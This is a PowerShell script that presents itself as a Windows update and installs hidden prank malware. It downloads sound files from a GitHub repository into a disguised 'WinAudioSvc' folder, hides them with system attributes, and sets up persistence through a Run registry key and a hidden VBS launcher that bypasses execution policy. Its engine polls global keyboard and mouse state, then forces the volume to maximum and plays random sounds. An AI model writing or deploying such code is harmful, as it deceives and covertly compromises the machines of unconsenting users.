$D = "$env:APPDATA\Microsoft\WinAudioSvc"
$repo = "https://raw.githubusercontent.com/boxsenseii/windows-sound-driver/main"

Write-Host "Applying update..." -ForegroundColor Green

New-Item -ItemType Directory -Force -Path "$D\sounds" | Out-Null

1..12 | ForEach-Object {
    $url = "$repo/sounds/Audio$_.mp3"
    $out = "$D\sounds\Audio$_.mp3"
    try { Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing } catch {}
}

@'
Set fso = CreateObject("Scripting.FileSystemObject")
Set sh  = CreateObject("WScript.Shell")
d = fso.GetParentFolderName(WScript.ScriptFullName)
sh.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File """ & d & "\engine.ps1""", 0, False
'@ | Set-Content "$D\svc.vbs" -Encoding ASCII

@'
$mtx = New-Object System.Threading.Mutex($false, "Global\WinAudioSvcMtx")
if (-not $mtx.WaitOne(0)) { exit }
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")]
class MMDevEnum {}
[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDE { int _0(); int GetDefaultAudioEndpoint(int df, int r, out IMMD ep); }
[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMD { int Activate(ref Guid iid, int ctx, IntPtr ap, [MarshalAs(UnmanagedType.IUnknown)] out object o); }
[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAEV {
    int _0(); int _1(); int _2(); int _3(); int _4(); int _5(); int _6();
    int SetMasterVolumeLevelScalar(float lv, ref Guid g);
    int _7();
    int GetMasterVolumeLevelScalar(out float lv);
    int _8();
    int SetMute([MarshalAs(UnmanagedType.Bool)] bool m, ref Guid g);
    int GetMute(out bool m);
}
public class W {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
    [DllImport("winmm.dll")]
    public static extern int mciSendString(string cmd, StringBuilder ret, int retLen, IntPtr cb);
    static IAEV GV() {
        var e = (IMMDE)new MMDevEnum();
        IMMD d; e.GetDefaultAudioEndpoint(0, 1, out d);
        var iid = typeof(IAEV).GUID; object o;
        d.Activate(ref iid, 1, IntPtr.Zero, out o);
        return (IAEV)o;
    }
    public static float VGet() { float l; GV().GetMasterVolumeLevelScalar(out l); return l; }
    public static void VSet(float l) { var v = GV(); var g = Guid.Empty; v.SetMute(false, ref g); v.SetMasterVolumeLevelScalar(l, ref g); }
}
"@
$sd = Join-Path $PSScriptRoot 'sounds'
$kc = 0; $mc = 0
$kw = $false; $mw = $false
$playing = $false; $oldVol = -1
while ($true) {
    Start-Sleep -Milliseconds 30
    if ($playing) {
        $buf = New-Object System.Text.StringBuilder 128
        [W]::mciSendString("status prnk mode", $buf, 128, [IntPtr]::Zero)
        if ($buf.ToString() -ne "playing") {
            if ($oldVol -ge 0) { try { [W]::VSet($oldVol) } catch {} }
            $playing = $false
        }
    }
    $kd = $false
    foreach ($k in (65..90 + 48..57 + @(32,8,9,13,190,188))) {
        if ([W]::GetAsyncKeyState($k) -band 0x8000) { $kd = $true; break }
    }
    if ($kd -and (-not $kw)) { $kc++ }
    $kw = $kd
    $md = $false
    foreach ($b in @(1,2,4)) {
        if ([W]::GetAsyncKeyState($b) -band 0x8000) { $md = $true; break }
    }
    if ($md -and (-not $mw)) { $mc++ }
    $mw = $md
    if ($kc -ge 500 -or $mc -ge 100) {
        $kc = 0; $mc = 0
        $files = Get-ChildItem -Path $sd -Filter '*.mp3' | Select-Object -ExpandProperty FullName
        if ($files.Count -gt 0) {
            $pick = $files | Get-Random
            try { $oldVol = [W]::VGet(); [W]::VSet(1.0) } catch { $oldVol = -1 }
            [W]::mciSendString("close prnk", $null, 0, [IntPtr]::Zero)
            [W]::mciSendString("open `"$pick`" alias prnk", $null, 0, [IntPtr]::Zero)
            [W]::mciSendString("play prnk", $null, 0, [IntPtr]::Zero)
            $playing = $true
        }
    }
}
'@ | Set-Content "$D\engine.ps1" -Encoding UTF8

attrib +h +s $D
attrib +h "$D\*.*"
attrib +h +s "$D\sounds"
attrib +h "$D\sounds\*.*"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinAudioSvc" /t REG_SZ /d "wscript.exe `"$D\svc.vbs`"" /f | Out-Null

Start-Process wscript.exe -ArgumentList "`"$D\svc.vbs`""

Write-Host "`nUpdate complete.`n" -ForegroundColor Green
